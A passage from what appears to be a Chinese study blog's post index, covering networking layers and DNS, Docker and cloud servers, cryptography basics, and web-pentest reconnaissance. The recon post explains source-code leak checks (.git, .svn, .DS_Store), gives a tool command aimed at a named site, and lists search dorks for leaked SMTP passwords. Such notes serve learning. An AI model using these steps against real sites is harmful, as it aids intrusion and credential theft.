协议（Internet Protocol），IP 协议会将传输层的报⽂作为数据部分，再加上 IP 包头组装成 IP 报⽂，如果 IP 报⽂⼤⼩超过 MTU（以太⽹中⼀般为 1500 字节）就会再次进⾏分⽚，得到⼀个即将发送到⽹络的 IP 报⽂。</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240426094501034.png" alt="image-20240426094501034"></p><p>网络层负责将数据从一个设备传输到另一个设备，世界上那么多设备，如何快速找到对方呢？因此，网络层需要有区分设备的编号</p><p>我们一般用IP地址给设备进行编号，对于IPv4协议，IP地址共32位，分成四段（比如192.168.132.00），每段是8位，从0-255。但是只有单纯的IP地址虽然做到了区分设备，但是寻址起来特别麻烦，全世界那么多设备，不可能做到一个个设备去匹配的，因此，IP地址有以下两种意义：</p><ul><li>一个是<strong>网络号</strong>，负责标识该IP地址是属于哪个子网的</li><li>一个是<strong>主机号</strong>，负责标识同一子网下的不同主机</li></ul><p>怎么分的呢？这需要配合<strong>⼦⽹掩码</strong>才能算出IP地址的⽹络号和主机号。举个例⼦，⽐如 10.100.122.0/24，后⾯的/24表示就255.255.255.0 ⼦⽹掩码，255.255.255.0 ⼆进制是「11111111-11111111-11111111-00000000」，是 24 个1，为了简化⼦⽹掩码的表示，⽤/24代替255.255.255.0</p><p>知道了⼦⽹掩码，该怎么计算出⽹络地址和主机地址呢？</p><p>将10.100.122.2和255.255.255.0进行按位与运算，就可以得到网络号</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240426095417751.png" alt="image-20240426095417751"></p><p>将255.255.255.0取反后与IP地址进行按位与运算，就可以得到主机号</p><p>寻址过程中，先匹配到相同的网络号（表示要找到同一个子网），才会找到相应的主机</p><p>除了寻址能力，IP协议还有另一个重要的能力就是路由，实际场景中，两台设备并不是用一条网线连接起来的，而是通过很多网关、路由器、交换机等众多设备连接起来的，所以会形成很多条网络的路径，因此当数据包到达一个网络结点，就要通过路由算法决定下一步走哪条路径，路由器寻址工作中，就是要找到目标地址的子网，找到后进而把数据包转发给对应的网络内</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240426105245681.png" alt="image-20240426105245681"></p><p>所以，IP协议的寻址作用是告诉我们下一个目的地该朝哪个方向走，路由则是根据下一个目的地选择路径，寻址更像导航，路由更像操作方向盘</p><h3 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h3><p>生成IP头部后，接下来要交给数据链路层在IP头部前面加上MAC头部，并封装成数据帧发送到网络上</p><p>IP头部中的接收方IP地址表示网络包的目的地，通过这个地址我们可以判断要将包发到哪里，但是在以太网的世界里，这个思路是行不通的</p><p>什么是以太网呢？电脑上的以太网接口，WiFi接口、以太网交换机、路由器上的千兆，万兆以太网口，还有网线，都是以太网的组成部分。以太网就是一种在局域网内，把附近的设备连接起来，使他们进行通讯的技术</p><p>以太网在判断网络包目的地时和IP的方式不同，因此必须采用相匹配的方式才能在以太网中将包发往目的地，而MAC头部就是干这个用的，所以，在以太网中进行通信要用到MAC地址</p><p>MAC 头部是以太⽹使⽤的头部，它包含了接收⽅和发送⽅的 MAC 地址等信息，我们可以通过 ARP 协议获取对⽅的 MAC 地址。所以说，⽹络接⼝层主要为⽹络层提供「链路级别」传输的服务，负责在以太⽹、WiFi 这样的底层⽹络上发送原始数据包，⼯作在⽹卡这个层次，使⽤ MAC 地址来标识⽹络上的设备。</p><h3 id="数据包封装格式"><a href="#数据包封装格式" class="headerlink" title="数据包封装格式"></a>数据包封装格式</h3><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240426112907688.png" alt="image-20240426112907688"></p><p>数据链路层的传输单位是帧，IP层的传输单位是包，TCP层的传输单位是段，HTTP的传输单位是消息或者报文</p><h2 id="HTTP协议作用过程"><a href="#HTTP协议作用过程" class="headerlink" title="HTTP协议作用过程"></a>HTTP协议作用过程</h2><p>想必不少小伙伴都想知道当键入网址，到网页显示，期间发生了什么，这就和HTTP关系密切了，接下来我们将以下图较简单的网络拓扑模型作为例子，探究究竟发生了什么</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240426113633652.png" alt="image-20240426113633652"></p><p>浏览器做的第一步是解析URL，URL解析后，生成发送给Web服务器的请求信息，下图展示了URL中的各个元素的含义</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240426113825508.png" alt="image-20240426113825508"></p><p>当没有路径名时，代表访问根目录下设置的默认文件，即/index.html（自己搭过网站的肯定很清楚），这样就不会混乱了</p><p>对URL进行解析后，浏览器确定了Web服务器和文件名，接下来就是根据这些信息来生成HTTP请求消息</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240426135537075.png" alt="image-20240426135537075"></p><p>但是仅仅靠一个小小的HTTP数据包，如何在浩瀚的网络中找到自己的归宿呢？</p><h3 id="真实地址查询-DNS"><a href="#真实地址查询-DNS" class="headerlink" title="真实地址查询-DNS"></a>真实地址查询-DNS</h3><p>通过浏览器解析URL并生成HTTP消息后，需要委托操作系统将消息发给Web服务器，但是在发送之前，需要知道服务器域名对应的IP地址，如果不知道IP地址，则相关的HTTP消息不能正确到达对应的服务器，而这种专门保存Web服务器域名与IP的对应关系的，叫做<strong>DNS服务器</strong></p><h3 id="域名的层级关系"><a href="#域名的层级关系" class="headerlink" title="域名的层级关系"></a>域名的层级关系</h3><p>DNS中的域名是用句点来分隔的，比如www.baidu.com，这里的句点代表了不同层次之间的界限</p><p>在域名中，越靠右的位置表示其层级越高，域名的最后还有一个点，比如www.baidu.com.，这个点代表根域名，即.根域是在最顶层，它的下一层就是.com顶级域名,再下面是baidu.com。所以域名的层级关系类似于一个树状结构</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240426192949727.png" alt="image-20240426192949727"></p><p>根域的DNS服务器信息保存在互联网中的所有DNS服务器中，这样一来，任何DNS服务器就都可以找到并访问根域服务器。因此，客户端只要能够找到任意一台DNS服务器，就可以通过它找到根域DNS服务器，然后再一路顺藤摸瓜找到位于下层的某台目标DNS服务器</p><h3 id="域名解析的工作流程"><a href="#域名解析的工作流程" class="headerlink" title="域名解析的工作流程"></a>域名解析的工作流程</h3><p>如下图所示，介绍相关迭代查询（现实生活中常用）</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240426193445579.png" alt="image-20240426193445579"></p><p>递归查询也有，但是很少，主要是递归查询是本地域名服务器不知道，然后向根域名询问，由根域名一步步去查询，最后给本地域名服务器返回对应的IP地址，这样容易造成根服务器使用频率过高，故在现实生活中不常用，主机向本地服务器查询用递归查询，本地服务器向根域名服务器查询使用迭代查询</p><p>但是并不会每一次都进行查询，不然所耗费的资源太多，浏览器会先看看自身有没有对这个域名的缓存，如果有，直接返回，如果没有，就去问操作系统，操作系统也会去看自己的缓存，如果有，就直接返回，如果没有，再去hosts文件看，如果也没有，才会去问本地DNS服务器</p><h3 id="协议栈"><a href="#协议栈" class="headerlink" title="协议栈"></a>协议栈</h3><p>数据包找到目的地了，但是还是很迷茫，它接下来需要找谁帮忙呢？这个时候就要用到<strong>协议栈</strong>了</p><p>通过DNS获取IP后，就可以把HTTP的传输工作交给操作系统中的协议栈。协议栈的内部分为几个部分，分别承担不同的工作，上下关系具有一定的规则，上面的部分会向下面的部分委托工作，下面的部分收到委托工作并执行</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240426195259231.png" alt="image-20240426195259231"></p><p>应用程序通过调用Socket库，来委托协议栈工作，协议栈的上半部分有两块，分别是负责收发数据的TCP和UDP协议，这两个传输协议会接受应用层的委托执行收发数据的操作</p><p>协议栈的下面一半是用IP协议控制网络包收发操作，在互联网上传数据时，数据会被切分成一块块的网络包，而将网络包发送给对方的操作就是由IP负责的</p><p>其中IP中还包括ICMP协议和ARP协议：ICMP用于告知网络包传输过程中产生的错误以及各种控制信息；ARP用于根据IP地址查询相应的以太网MAC地址</p><p>IP下面的网卡驱动程序负责控制⽹卡硬件，⽽最下⾯的⽹卡则负责完成实际的收发操作，也就是对⽹线中的信号执⾏发送和接收操作</p><p>HTTP的传输需要那么多的协议协助，我们将一个个进行介绍</p>]]></content>
      
      
      <categories>
          
          <category> 学校课程 </category>
          
          <category> 计算机网络 </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -计算机网络 -TCP/IP模型 -HTTP协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息打点-资产架构&amp;源码泄露</title>
      <link href="/post/edfab61a.html"/>
      <url>/post/edfab61a.html</url>
      
        <content type="html"><![CDATA[<h2 id="资产架构"><a href="#资产架构" class="headerlink" title="资产架构"></a>资产架构</h2><h3 id="WEB单个源码安全"><a href="#WEB单个源码安全" class="headerlink" title="WEB单个源码安全"></a>WEB单个源码安全</h3><p>单个源码的目录指向单个站点域名</p><h3 id="WEB多个目录源码安全"><a href="#WEB多个目录源码安全" class="headerlink" title="WEB多个目录源码安全"></a>WEB多个目录源码安全</h3><p>一个网站，两套程序，任何一个程序出现问题都可以进行渗透测试，选择不同的目录</p><p>例如：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">www.borgeous.com           论坛</span><br><span class="line">www.borgeous.com/blog      wordpress程序</span><br></pre></td></tr></table></figure><h3 id="WEB多个端口源码安全"><a href="#WEB多个端口源码安全" class="headerlink" title="WEB多个端口源码安全"></a>WEB多个端口源码安全</h3><p>用端口区分不同的程序，当某一端口出现漏洞时，即可进行渗透测试</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">www.borgeous.com           论坛</span><br><span class="line">www.borgeous.com:<span class="number">8081</span>      wordpress程序</span><br></pre></td></tr></table></figure><h3 id="服务器架设多个站点安全"><a href="#服务器架设多个站点安全" class="headerlink" title="服务器架设多个站点安全"></a>服务器架设多个站点安全</h3><p>同一个ip下的子域名，例如</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">bbs.borgeous.com <span class="number">47.178</span><span class="number">.156</span><span class="number">.32</span> dz论坛</span><br><span class="line">edu.borgeous.com <span class="number">47.178</span><span class="number">.156</span><span class="number">.32</span> edu程序</span><br><span class="line">子域名，同一个IP</span><br></pre></td></tr></table></figure><p>给到目标bbs.borgeous.com，可以尝试对edu.borgeous.com进行测试</p><h3 id="架设第三方插件接口安全"><a href="#架设第三方插件接口安全" class="headerlink" title="架设第三方插件接口安全"></a>架设第三方插件接口安全</h3><p>wordpress插件</p><p>web应用插件（phpmyadmin)  ——&gt;数据库管理插件</p><p>有些数据库不支持外联，为了方便数据库管理，会安装插件，但也方便了攻击者攻击数据库</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/aaaae2291395f9ec8c159939f85e9f87.png" alt="image-20231102141418205"></p><h3 id="服务器架设多个应用安全"><a href="#服务器架设多个应用安全" class="headerlink" title="服务器架设多个应用安全"></a>服务器架设多个应用安全</h3><p>例如</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">服务器应用：ftp服务器</span><br><span class="line">方便管理员进行文件操作，也方便攻击者攻击ftp协议服务</span><br></pre></td></tr></table></figure><h2 id="攻击阻碍"><a href="#攻击阻碍" class="headerlink" title="攻击阻碍"></a>攻击阻碍</h2><h3 id="站库分离"><a href="#站库分离" class="headerlink" title="站库分离"></a>站库分离</h3><p>站点和数据库存放的地址不同，需要进行远程协同。</p><p>即安装程序的时候，会选择将数据库安装在远程地址，从而将数据库和源码放在不同的地方，以达到站库分离，此时获取就比较困难</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/8ac702f25d644c108d5189a3c9a113b8.png" alt="image-20231102142716711"></p><h3 id="负载均衡服务"><a href="#负载均衡服务" class="headerlink" title="负载均衡服务"></a>负载均衡服务</h3><p>为了防止某台主机死机或者流量过大的情况产生，负载均衡服务会提供备用服务器进行加速，所以可能我们会拿下备用服务器的权限，而不是主机的权限</p><h3 id="CDN加速服务"><a href="#CDN加速服务" class="headerlink" title="CDN加速服务"></a>CDN加速服务</h3><p>CDN结点：相当于中间结点，解决访问速度过慢的情况，购买之后，访问结点相当于访问缓存，如果攻击下CDN的权限，可能只是拿下缓存的权限</p><h3 id="WAF应用-主机应用防火墙"><a href="#WAF应用-主机应用防火墙" class="headerlink" title="WAF应用/主机应用防火墙"></a>WAF应用/主机应用防火墙</h3><p>WAF应用防火墙：针对网站的防护，应用层防火墙</p><p>主机防护防护墙：360、火绒、安全狗等，针对于系统防护</p><h2 id="源码获取"><a href="#源码获取" class="headerlink" title="源码获取"></a>源码获取</h2><h3 id="常见源码泄露"><a href="#常见源码泄露" class="headerlink" title="常见源码泄露"></a>常见源码泄露</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git源码泄露</span><br><span class="line">svn源码泄露</span><br><span class="line">hg源码泄露</span><br><span class="line">网站备份压缩文件/.zip/.rar</span><br><span class="line">WEB-INF/web.xml 泄露</span><br><span class="line">DS_Store 文件泄露</span><br><span class="line">SWP 文件泄露</span><br><span class="line">CVS 泄露</span><br><span class="line">Bzr 泄露</span><br><span class="line">GitHub 源码泄漏</span><br></pre></td></tr></table></figure><h3 id="CMS识别（网站指纹识别）"><a href="#CMS识别（网站指纹识别）" class="headerlink" title="CMS识别（网站指纹识别）"></a>CMS识别（网站指纹识别）</h3><p>1.观察网站特征信息，找到是什么CMS搭建的，然后下载源码</p><p>2.用云悉平台识别CMS：<a href="https://www.yunsee.cn/">https://www.yunsee.cn/</a></p><h3 id="GIT泄露"><a href="#GIT泄露" class="headerlink" title="GIT泄露"></a>GIT泄露</h3><p>在执行<code>git init</code>初始化目录的时候，会在当前目录下自动创建一个<code>.git</code>目录，用来记录代码的变更记录等。发布代码的时候，如果没有把<code>.git</code>这个目录删除，就直接发布到了服务器上，攻击者就可以通过它来恢复源代码</p><p>访问<code>xxxx/.git</code>，进入403页面，说明存在git泄露</p><p>利用工具：<code>githack</code></p><h3 id="SVN源码泄露"><a href="#SVN源码泄露" class="headerlink" title="SVN源码泄露"></a>SVN源码泄露</h3><p><code>svn</code>也是一个版本控制平台，原理与Git源码泄露的原理相同。判断方式：在域名后面直接加<code>.svn/entries</code>。如果存在，就利用<code>SvnHack</code>获取源码文件</p><h3 id="DS-Store泄露"><a href="#DS-Store泄露" class="headerlink" title="DS_Store泄露"></a>DS_Store泄露</h3><p><code>.DS_Store</code>是<code>Mac</code>下<code>Finder</code>用来保存如何展示文件/文件夹的数据文件，每个文件夹下对应一个。如果将<code>.DS_Store</code>上传到服务器上，可能会造成文件目录结构泄露，特别是备份文件、源代码文件</p><p>访问<code>xxxx..DS_Store</code>浏览器会自动下载DS_Store文件</p><p>漏洞利用工具：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">github项目地址：https://github.com/lijiejie/ds_store_exp</span><br><span class="line">用法示例：</span><br><span class="line">ds_store_exp.py http://zhuchao.yslts.com/.DS_Store</span><br></pre></td></tr></table></figure><h3 id="composer-json泄露-利用PHP特性"><a href="#composer-json泄露-利用PHP特性" class="headerlink" title="composer.json泄露-利用PHP特性"></a>composer.json泄露-利用PHP特性</h3><p>使用方法：直接在域名后面加<code>/composer.json</code>,</p><p>可能获取到网站使用的CMS和其他版本信息</p><p>比如，<code>访问：http://english.cmdesign.com.cn/composer.json，</code>获取到其CMS等信息</p><h3 id="WEB-INF-web-xml泄露"><a href="#WEB-INF-web-xml泄露" class="headerlink" title="WEB-INF/web.xml泄露"></a>WEB-INF/web.xml泄露</h3><p><code>WEB-INF</code>是Java的web应用的安全目录，如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应的映射才能访问</p><p><code>WEB-INF</code> 主要包含一下文件或目录：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">WEB-INF/web.xml : Web应用程序配置文件, 描述了servlet和其他的应用组件配置及命名规则.</span><br><span class="line">WEB-INF/database.properties : 数据库配置文件</span><br><span class="line">WEB-INF/classes/ : 一般用来存放Java类文件(.class)</span><br><span class="line">WEB-INF/lib/ : 用来存放打包好的库(.jar)</span><br><span class="line">WEB-INF/src/ : 用来放源代码(.asp和.php等)</span><br></pre></td></tr></table></figure><h2 id="资源监控"><a href="#资源监控" class="headerlink" title="资源监控"></a>资源监控</h2><h3 id="GITHUB资源搜索"><a href="#GITHUB资源搜索" class="headerlink" title="GITHUB资源搜索"></a>GITHUB资源搜索</h3><p><strong>github.com、gitee.com</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">in</span>:name test <span class="comment">#仓库标题搜索含有关键字</span></span><br><span class="line"><span class="keyword">in</span>:descripton test <span class="comment">#仓库描述搜索含有关键字</span></span><br><span class="line"><span class="keyword">in</span>:readme test <span class="comment">#Readme 文件搜素含有关键字</span></span><br><span class="line">stars:&gt;<span class="number">3000</span> test <span class="comment">#stars 数量大于 3000 的搜索关键字</span></span><br><span class="line">stars:<span class="number">1000.</span><span class="number">.3000</span> test <span class="comment">#stars 数量大于 1000 小于 3000 的搜索关键字</span></span><br><span class="line">forks:&gt;<span class="number">1000</span> test <span class="comment">#forks 数量大于 1000 的搜索关键字</span></span><br><span class="line">forks:<span class="number">1000.</span><span class="number">.3000</span> test <span class="comment">#forks 数量大于 1000 小于 3000 的搜索关键字</span></span><br><span class="line">size:&gt;=<span class="number">5000</span> test <span class="comment">#指定仓库大于 5000k(5M)的搜索关键字</span></span><br><span class="line">pushed:&gt;<span class="number">2019</span>-02-<span class="number">12</span> test <span class="comment">#发布时间大于 2019-02-12 的搜索关键字</span></span><br><span class="line">created:&gt;<span class="number">2019</span>-02-<span class="number">12</span> test <span class="comment">#创建时间大于 2019-02-12 的搜索关键字</span></span><br><span class="line">user:test <span class="comment">#用户名搜素的搜索关键字</span></span><br><span class="line">license:apache-<span class="number">2.0</span> test <span class="comment">#明确仓库的 LICENSE 搜索关键字</span></span><br><span class="line">language:java test <span class="comment">#在 java 语 言的代码中搜索关键字</span></span><br><span class="line">user:test <span class="keyword">in</span>:name test <span class="comment">#组合搜索,用户名 test 的标题含有 test 的</span></span><br></pre></td></tr></table></figure><p><strong>关键字配合谷歌、必应搜索</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">site:Github.com smtp</span><br><span class="line">site:Github.com smtp @qq.com</span><br><span class="line">site:Github.com smtp @<span class="number">126.</span>com</span><br><span class="line">site:Github.com smtp @<span class="number">163.</span>com</span><br><span class="line">site:Github.com smtp @sina.com.cn</span><br><span class="line">site:Github.com smtp password</span><br><span class="line">site:Github.com String password smtp</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> 信息打点 </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -Web安全 -资产架构 -端口 -CDN -WAF -源码泄露 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker内部详解</title>
      <link href="/post/24ef11e7.html"/>
      <url>/post/24ef11e7.html</url>
      
        <content type="html"><![CDATA[<p>上一篇文章已经讲述了为什么会有Docker容器的出现，其实本质上来说，Docker是代码和操作系统之间的中间层，为了解决程序员“这个程序在我的电脑上明明能跑，为什么到你那就不行了呢”的问题。科学家们选择将<strong>程序</strong>和<strong>环境</strong>（依赖库和配置）一起打包给到对方运行，而这个打包并运行的工具软件，就是<mark class="hl-label red">Docker</mark> ，接下来我们看看它具体是怎么实现的</p><h2 id=""><a href="#" class="headerlink" title=""></a><mark class="hl-label blue">基础镜像</mark> </h2><p>既然环境不同会导致运行结果不同，那么我们首先要做的事情就是<font color=  #BBFFFF><strong>统一环境</strong></font>。而环境中最重要的就是<font color=  #BBFFFF><strong>操作系统</strong></font>。我们得让所有程序都跑在同一个操作系统上，但是如果打包整个操作系统，那空间未免需要占用的太多，但是我们又知道，操作系统分为用户空间和内核空间，并且<strong>应用程序都是运行在用户空间的</strong>，这不就解决了，我们完全可以阉割操作系统，只要操作系统的用户空间部分，就能构建我们想要的环境。</p><p>其次我们需要统一语言，即<font color=  #BBFFFF><strong>程序语言依赖</strong></font>，我们要跑python，好歹得装个python解释器吧；要跑JAVA应用，得装个JVM吧。所以，程序语言依赖也是必不可少的一项</p><p>我们选中一个基础的操作系统和程序语言后，我们将它们对应的文件系统，依赖库，配置等放在一起打包成压缩包似的文件，这就是所谓的<mark class="hl-label red">基础镜像</mark> </p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240415112709356.png" alt="image-20240415112709356"></p><h2 id="-1"><a href="#-1" class="headerlink" title=""></a><mark class="hl-label blue">Dockerfile是什么</mark> </h2><p>单纯有基础镜像显然是不够的，我们经常还需要安装一些依赖，比如gcc等，甚至还要创建一些文件夹，才能运行我们的应用程序。linux中，所有的命令都通过命令行实现，所以有了基础镜像后，我们还需要用命令行将依赖装好，这时候，我们可以将所需要的命令一行行地列出来，就像一份<font color=  #BBFFFF><strong>To Do List</strong></font>，意思是要求在基础镜像的基础上按着 To Do List挨个执行命令，比如下面的To Do List</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 指定基础镜像</span></span><br><span class="line">FROM python:<span class="number">3.9</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置工作目录</span></span><br><span class="line">WORKDIR /app</span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制依赖文件到容器中</span></span><br><span class="line">COPY requirements.txt .</span><br><span class="line"></span><br><span class="line">RUN yum install gcc</span><br><span class="line"><span class="comment"># 安装依赖</span></span><br><span class="line">RUN pip install --no-cache-<span class="built_in">dir</span> -r requirements.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将当前目录下的所有文件复制到容器的 /app 目录下</span></span><br><span class="line">COPY . /app</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置容器启动时执行的命令</span></span><br><span class="line">CMD [<span class="string">&quot;python&quot;</span>, <span class="string">&quot;app.py&quot;</span>]</span><br></pre></td></tr></table></figure><p>像这样一份列清楚了从操作系统到应用服务启动，需要做哪些事情的清单文件，就叫做<font color=  #BBFFFF><strong>Dockerfile</strong></font></p><h2 id="-2"><a href="#-2" class="headerlink" title=""></a><mark class="hl-label blue">容器镜像是什么</mark> </h2><p>Dockerfile只是描述了要做哪些事，并没有真正开始做，当我们执行<font color=  #BBFFFF><strong>Docker Build</strong></font></p>]]></content>
      
      
      <categories>
          
          <category> 面试知识点 </category>
          
          <category> 操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 虚拟机 </tag>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker和传统虚拟机的区别</title>
      <link href="/post/76b76384.html"/>
      <url>/post/76b76384.html</url>
      
        <content type="html"><![CDATA[<p>最近在部署自己的博客时遇见过购买服务器的问题，当时打开阿里云轻量级服务器时，看见这么多的实例，属实是自己也有点懵逼，什么ECS，VPS，ECI一大堆，自己也不知道是什么东西，但是跟着CSDN教程，还是把服务器给选好了；这两天在学习操作系统的时候，老师也讲到docker技术，并且给我们强调了它和虚拟机的区别，当时旁边一个同学一直在说docker和nachos没什么太大的区别，我很疑惑，于是在课后搜索了相关资料，汇总成这一篇学习笔记</p><h2 id=""><a href="#" class="headerlink" title=""></a><mark class="hl-label blue">物理服务器是什么？</mark> </h2><p>当时在搭建网站的时候，搜索服务器的时候，网站上给我很多推荐，教我如何自己搭建一台属于自己的服务器，当时点进去稍微浏览了一下，其实用一台废弃的电脑就可以做成，因为一台自己的服务器只需要cpu、内存等硬件以及操作系统，像这样的一台看得见摸得着的机器，其实就是云厂商页面里提到的<mark class="hl-label purple">物理服务器</mark> 或者<mark class="hl-label purple">物理机</mark> ，有的厂商叫它<mark class="hl-label purple">独立服务器</mark> </p><p>所以我们为什么要买云厂商的服务器呢？自己搭建一个属于自己的不香吗？</p><p>当然不香，自己搭建在家里不耗电吗？一年下来电费都好几百，还得花精力给它维修，保证它不关机，最重要的是，性能还没云厂商的好，核数还没人家的高，自己搭那真是纯小丑🤡🤡</p><p>但是问题又来了，云厂商的物理服务器一般都是固定的，而且很高，我们购买云服务器的时候是可以选择对应核数的，并且我们有时候根本不需要这么高配的机器，那怎么办呢？这一点当然云厂商也考虑到了。</p><h2 id="-1"><a href="#-1" class="headerlink" title=""></a><mark class="hl-label blue">vps和ecs是什么？</mark> </h2><p>云厂商一般会将一台物理服务器分割为多个虚拟机，跟我们在自己的电脑上安装VMware建立虚拟机是一个道理。每个虚拟机都有自己独立的操作系统、资源（CPU、内存、存储空间）和公网IP地址，然后对外出售，这样的虚拟机就是<strong>VPS</strong>（Virtual Private Server，虚拟专用服务器）</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240412111503808.png" alt="image-20240412111503808"></p><p>但是传统VPS有个缺点，不支持用户自主升降级，资源是预先分配好的并且不易于动态调整的，即你买了1核1G的服务器，想给它升级成2核2G的，但在VPS中是不能实现的，如果加入自主升级降级的功能，那就成了<strong>ECS</strong>（Elastic Compute Service，弹性计算服务）</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240412112116264.png" alt="image-20240412112116264"></p><p>用户可以根据需要随时调整CPU、内存、磁盘和带宽，所以为什么叫<mark class="hl-label purple">弹性</mark> </p><h2 id="-2"><a href="#-2" class="headerlink" title=""></a><mark class="hl-label blue">docker容器是什么？</mark> </h2><p>有了自己的ECS后，一般我们会开始部署自己的软件应用，机器少的时候我们手动部署问题不大，机器多了的话各种问题就来了，最明显的就是底层操作系统的不同，部署应用的时候会有各种环境问题，但是如果能让软件带着操作系统环境一起部署就好了，最简单的办法就是让软件和操作系统一起打包成虚拟机部署在ECS中，但是这样东西太多了，太重了。</p><p>聪明的科学家们想到了解法，既然一个操作系统太重，那就只打包<mark class="hl-label purple">软件和系统依赖库加载配置</mark> 就好了。然后将这部分系统文件挂载到ECS操作系统下，利用一个叫<mark class="hl-label purple">Namespace</mark>  的能力让它看起来像一个独立的操作系统一样，再利用一个叫<mark class="hl-label purple">Cgroup</mark> 的能力限制它能使用的计算资源，这样省掉了一层笨重的操作系统，同时让软件轻松地运行在各类操作系统上，这就是常说的Docker容器技术</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240412154242434.png" alt="image-20240412154242434"></p><p>总的来说，就是服务器上跑ECS，ECS上跑Docker容器，多个Docker容器共享一个ECS实例</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240412154402520.png" alt="image-20240412154402520"></p><h2 id="-3"><a href="#-3" class="headerlink" title=""></a><mark class="hl-label blue">Nachos是什么？</mark> </h2><p>Nachos全程(Not Another Completely Heuristic Operating System)，是一个教学用的操作系统，提供了操作系统的框架。本质上是Linux宿主机上的一个进程，是一个框架，很多地方的实现都需要我们自己来完善，在完善这些功能的同时，可以帮助我们更加的了解到操作系统的内部运行机制，只是一个身体力行的教学平台！！！和Docker半毛钱关系都没有，老师上课讲Docker，可能只是想让我们用Docker管理自己的Nachos！</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240412160555824.png" alt="image-20240412160555824"></p><p>所以，有些东西还得自己去看，听别人的只能把自己搞得更糊涂</p><h2 id="文章参考来源"><a href="#文章参考来源" class="headerlink" title="文章参考来源"></a>文章参考来源</h2><p><a href="https://mp.weixin.qq.com/s?__biz=MzUxODAzNDg4NQ==&amp;mid=2247534049&amp;idx=2&amp;sn=1ef2674ddb3217bbafcb5cd6946407ac&amp;chksm=f98d014bcefa885d6b68c0405718abf634a33427264a8ae4d04bc478bc03121dbfdceed7012e&amp;scene=21#wechat_redirect">面试官：Docker和传统虚拟机有什么区别？</a></p><p>NachOs实验文档（老师发的）</p>]]></content>
      
      
      <categories>
          
          <category> 面试知识点 </category>
          
          <category> 操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 虚拟机 </tag>
            
            <tag> Docker </tag>
            
            <tag> Nachos </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基础入门-加密算法&amp;Web&amp;数据库&amp;系统&amp;代码</title>
      <link href="/post/f52e1c95.html"/>
      <url>/post/f52e1c95.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ol><li><p>本博客仅用于个人复习和学习，无商业用途</p></li><li><p>遇到问题，优先在本页搜索，检查是否有相关教程</p></li><li>请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者以及本博客无关</li></ol><h2 id="0x0-密码存储加密"><a href="#0x0-密码存储加密" class="headerlink" title="0x0. 密码存储加密"></a>0x0. 密码存储加密</h2><ul><li><p>MD5：是由32或16位由数字“0-9”和字母“a-f”所组成的字符串，是一种不可逆的加密算法，不区分大小写，其中16位值取的是32位中的8-24位（但是不代表不可以解密，可以使用哈希碰撞进行解密）</p></li><li><p>MD5&amp;salt：加盐操作，用于增强密码存储安全性的技术，由系统随机生成一个盐值（salt），将生成的盐值与用户密码进行拼接，拼接后进行哈希计算，将盐值和哈希值一起存储在数据库中，用以后续验证使用（DISCUZ网站）</p></li><li><p>SHA1（安全哈希算法）：类似于MD5，只不过位数是40，同样是数字“0-9”和字母“a-f”所组成的字符串</p></li><li><p>NTLM：储存在windows的哈希密码，当密码为系统密码时，大概率是NTLM加密算法，和MD5类似，标准通讯安全协议</p></li><li><p>AES、DES、RC4是对称加密算法，引入对称密钥，密文特征与BASE64类似</p></li></ul><h2 id="0x1-传输数据编码"><a href="#0x1-传输数据编码" class="headerlink" title="0x1. 传输数据编码"></a>0x1. 